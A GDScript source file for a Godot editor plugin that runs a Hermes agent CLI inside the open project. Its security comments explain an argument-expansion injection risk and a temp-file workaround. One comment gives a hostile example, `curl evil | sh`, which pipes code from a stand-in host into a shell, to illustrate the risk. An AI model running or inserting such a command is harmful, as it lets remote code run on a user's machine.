@tool
extends Node

## hermes_bridge.gd - Process plumbing for a REAL Hermes agent, launched
## fresh per turn as `hermes chat -Q -q "<message>"` with the editor's
## own project directory as its working directory.
##
## This is the deliberate architectural break from
## addons/godot_ollama_task_performer/ollama_client.gd, which POSTs to
## Ollama's HTTP /api/chat endpoint and gets back plain text with no
## agentic capability at all. There is no equivalent here on purpose:
## no operation allowlist, no JSON command contract, no
## OperationRegistry-style parse-and-dispatch layer. Hermes keeps its own
## native tool-calling (file read/write, shell, search, tests) — this
## script's only job is: build the right command, run it with the right
## cwd, and hand back whatever Hermes actually said.
##
## SECURITY NOTE — read before changing how a message reaches Hermes:
## OS.execute() in this Godot build performs its own shell-style
## expansion ($VAR, `cmd`, $(cmd)) on EVERY element of its "arguments"
## array before the target process ever runs — verified directly, not
## assumed: a literal "$HOME" argument came back substituted, and a
## literal backtick-wrapped command was actually EXECUTED by Godot's own
## internal process-spawn layer. That makes passing a player-typed
## message straight through as a CLI argument a real command-injection
## vector (a message containing `` `curl evil | sh` `` would actually
## run it) — not a theoretical one, and no amount of manual shell-quoting
## on this script's own side fixes it, because Godot's expansion happens
## on the raw argument string BEFORE any bash of ours ever sees it.
##
## THE FIX, applied below: the message never enters OS.execute's
## "arguments" array at all. It's written to a plain temp file via
## FileAccess (zero shell/process involvement — proven safe, file
## content is never touched by the expansion pass, only arguments are).
## A wrapper script — built entirely from plugin-controlled strings
## (cwd, hermes path, temp paths this file itself generates; never the
## message) — reads that file via `cat` inside its own single, real bash
## parse. OS.execute() then runs THAT SCRIPT with an EMPTY arguments
## array, so there is nothing left for Godot's own expansion to find.
## This exact pattern was proven against a real adversarial payload
## (literal $(...), backticks, unset $VARs) before this file was written
## this way — see test_hermes_bridge_logic.gd in this same directory.
##
## First milestone success criterion (verbatim from the design
## instruction): "Hermes is genuinely sitting inside the editor and can
## inspect/edit the current project." Nothing in this file proves that
## on its own — only opening the real Godot editor, enabling this
## plugin, and sending a real message proves it. The command-
## construction and output-parsing logic below IS covered by a real,
## executed test; the actual editor-embedded Hermes call is not, and
## must not be reported as proven until someone does that by hand.

signal turn_finished(result: Dictionary)

var session_id: String = ""  # empty until the first real reply names one
var _thread: Thread
var _discard_pending: bool = false

const _SESSION_ID_LINE_PATTERN := "^session_id:\\s*(\\S+)\\s*$"


## The real, absolute filesystem path of the currently open Godot
## project — this is the `cwd` Hermes's own file/shell tools will
## operate against, so it must be the project root (res://'s target on
## disk), not any virtual/packed path.
static func project_root() -> String:
	return ProjectSettings.globalize_path("res://")


## Starts one turn in a background thread — OS.execute() blocks, and a
## real Hermes call can take several seconds to minutes; running it on
## the main thread would freeze the whole editor UI, not just this dock.
## Emits turn_finished (via call_deferred, so it lands safely on the main
## thread) when the subprocess returns, one way or another.
func send(message: String, model: String = "", provider: String = "") -> void:
	if _thread and _thread.is_started():
		_thread.wait_to_finish()
	var hermes_path := find_hermes_executable()
	_thread = Thread.new()
	_thread.start(_run_hermes.bind(hermes_path, message, session_id, model, provider, project_root()))


## Marks the currently in-flight reply to be discarded once it returns.
## This is NOT process cancellation — there is no cooperative way to kill
## a synchronous OS.execute() call, and no PID is available to signal.
## The underlying hermes subprocess keeps running to completion either
## way; only the dock's own handling of that eventual result changes.
## Matches this project's own established honesty convention for a
## "can't actually stop it" limitation — see
## addons/godot_ollama_task_performer/README.md's own "Known
## Limitations" section on run_scene for the precedent.
func request_stop() -> void:
	_discard_pending = true


func _run_hermes(hermes_path: String, message: String, resume_session_id: String, model: String, provider: String, cwd: String) -> void:
	var result := {
		"success": false,
		"response": "",
		"session_id": "",
		"error": "",
	}

	if hermes_path.is_empty():
		result["error"] = "hermes executable not found (checked PATH and common install locations)."
		call_deferred("_emit_result", result)
		return

	var unique := "%d_%d" % [Time.get_ticks_usec(), randi()]
	var tmp_dir := OS.get_temp_dir()
	var query_path := tmp_dir.path_join("hermes_editor_query_%s.txt" % unique)
	var script_path := tmp_dir.path_join("hermes_editor_run_%s.sh" % unique)

	var write_err := _write_query_file(query_path, message)
	if write_err != OK:
		result["error"] = "failed to write temp query file (%s): error %d" % [query_path, write_err]
		call_deferred("_emit_result", result)
		return

	var script_content := build_wrapper_script(hermes_path, query_path, cwd, resume_session_id, model, provider)
	var script_err := _write_query_file(script_path, script_content)  # same plain-write helper; no shell involved either way
	if script_err != OK:
		result["error"] = "failed to write temp wrapper script (%s): error %d" % [script_path, script_err]
		_cleanup_temp_files([query_path])
		call_deferred("_emit_result", result)
		return

	var output: Array = []
	# Empty arguments array on purpose — see this file's own top-of-file
	# SECURITY NOTE. script_path is plugin-generated (temp dir + a
	# numeric suffix), never user content, so even though Godot's own
	# expansion pass still runs on it, there is nothing in it for that
	# pass to corrupt.
	var exit_code := OS.execute("/bin/bash", [script_path], output, true)
	var combined := "\n".join(output)
	_cleanup_temp_files([query_path, script_path])

	var sid := extract_session_id(combined)
	if not sid.is_empty():
		result["session_id"] = sid
		session_id = sid  # only ever advances on a real reply, same rule as EngAIn's own cursor (never guessed, never on failure)

	if exit_code != 0:
		result["error"] = "hermes exited %d:\n%s" % [exit_code, combined]
		call_deferred("_emit_result", result)
		return

	result["success"] = true
	result["response"] = strip_session_line(combined)
	call_deferred("_emit_result", result)


func _emit_result(result: Dictionary) -> void:
	if _discard_pending:
		_discard_pending = false
		return
	turn_finished.emit(result)


static func _write_query_file(path: String, content: String) -> Error:
	var handle := FileAccess.open(path, FileAccess.WRITE)
	if handle == null:
		return FileAccess.get_open_error()
	handle.store_string(content)
	handle.close()
	return OK


static func _cleanup_temp_files(paths: PackedStringArray) -> void:
	for p in paths:
		if FileAccess.file_exists(p):
			DirAccess.remove_absolute(p)


## Builds the wrapper script's full text. Every dynamic piece here is
## plugin-controlled (cwd, hermes_path, the query file's own path,
## session_id/model/provider fields from the dock's own small text
## inputs) — the actual player-typed message is NEVER embedded in this
## string; the script reads it itself, at run time, via `cat`. Uses
## real shell_quote() single-quote escaping throughout, which is correct
## and sufficient here specifically BECAUSE this string becomes real
## FILE CONTENT executed by a genuine, single bash parse — the exact
## case shell_quote() was designed for (see this file's own SECURITY
## NOTE for why the same escaping was NOT sufficient when these pieces
## were previously assembled into an OS.execute() "arguments" element
## instead of a script file).
##
## -Q            quiet mode: only the final response + session info, no
##               banner/spinner/tool-call previews — required for this
##               to be parseable rather than a scrollback dump.
## --source tool marks this as a third-party integration session (per
##               `hermes chat --help`'s own description), matching how
##               this project's other tool-side Hermes callers identify
##               themselves (see tools/live_dispatch_mutex_contention_proof.py).
## --pass-session-id includes the session ID in Hermes's own system
##               prompt — same flag this project's other adapters use.
## --resume <id> only appended once a prior turn has actually reported a
##               session_id — the very first turn in a fresh dock has
##               none yet and starts a new Hermes session.
## model/provider only appended if the dock's own fields are non-empty —
##               otherwise Hermes's own configured defaults apply,
##               exactly as they would from a normal terminal.
## Deliberately NOT passed: --ignore-rules, --ignore-user-config,
## --safe-mode. Those strip AGENTS.md/memory/skills/plugin injection —
## appropriate for an isolated reproducibility proof (which is where this
## project's existing live-proof scripts use them), wrong for a real
## working seat that should behave exactly like Hermes anywhere else.
static func build_wrapper_script(hermes_path: String, query_path: String, cwd: String, resume_session_id: String, model: String, provider: String) -> String:
	var lines: PackedStringArray = [
		"#!/bin/bash",
		"set -o errexit",
		"cd %s" % shell_quote(cwd),
	]
	var invocation := "%s chat -Q --source tool --pass-session-id" % shell_quote(hermes_path)
	if not resume_session_id.is_empty():
		invocation += " --resume %s" % shell_quote(resume_session_id)
	if not model.is_empty():
		invocation += " -m %s" % shell_quote(model)
	if not provider.is_empty():
		invocation += " --provider %s" % shell_quote(provider)
	# $(cat ...) inside double quotes: a single, real bash parse of a
	# script FILE (not an OS.execute argument) — the message's exact
	# content, including embedded spaces/quotes/$/backticks, becomes the
	# literal -q value. Command substitution strips trailing newlines
	# (POSIX-defined); harmless for a single-line chat message.
	invocation += ' -q "$(cat %s)"' % shell_quote(query_path)
	lines.append(invocation)
	return "\n".join(lines) + "\n"


## POSIX single-quote escaping: wrap in single quotes, and turn any
## embedded single quote into '\'' (close quote, escaped literal quote,
## reopen quote). Correct and sufficient for content that becomes real
## script-file text interpreted by a genuine single bash parse — see
## this file's own SECURITY NOTE for the one case (an OS.execute()
## "arguments" element) where this is NOT sufficient on its own.
static func shell_quote(s: String) -> String:
	return "'" + s.replace("'", "'\\''") + "'"


## Extracts the session_id Hermes reports (in -Q mode, on its own line —
## see this project's own tools/live_dispatch_mutex_contention_proof.py
## for the same pattern against real Hermes output) from combined
## stdout+stderr. Returns "" if none is present (a failed call, or an
## unexpected output shape).
static func extract_session_id(combined_output: String) -> String:
	var pattern := RegEx.new()
	pattern.compile(_SESSION_ID_LINE_PATTERN)
	for line in combined_output.split("\n"):
		var m := pattern.search(line)
		if m:
			return m.get_string(1)
	return ""


## Removes the session_id line(s) from the combined output, leaving just
## Hermes's actual reply text for display in the transcript.
static func strip_session_line(combined_output: String) -> String:
	var pattern := RegEx.new()
	pattern.compile(_SESSION_ID_LINE_PATTERN)
	var kept: PackedStringArray = []
	for line in combined_output.split("\n"):
		if pattern.search(line):
			continue
		kept.append(line)
	return "\n".join(kept).strip_edges()


## Resolves the hermes executable. Checked in order: common fixed
## install locations, then `which hermes` as a fallback for anything
## this hardcoded list doesn't guess. Safe from the OS.execute expansion
## issue regardless — "hermes" and the fixed candidate paths are all
## plugin-authored literals, never user content.
static func find_hermes_executable() -> String:
	var candidates: PackedStringArray = ["/usr/bin/hermes", "/usr/local/bin/hermes"]
	var home := OS.get_environment("HOME")
	if not home.is_empty():
		candidates.append(home.path_join(".local/bin/hermes"))
	for c in candidates:
		if FileAccess.file_exists(c):
			return c
	var which_output: Array = []
	var which_exit := OS.execute("/usr/bin/which", ["hermes"], which_output)
	if which_exit == 0 and not which_output.is_empty():
		return String(which_output[0]).strip_edges()
	return ""
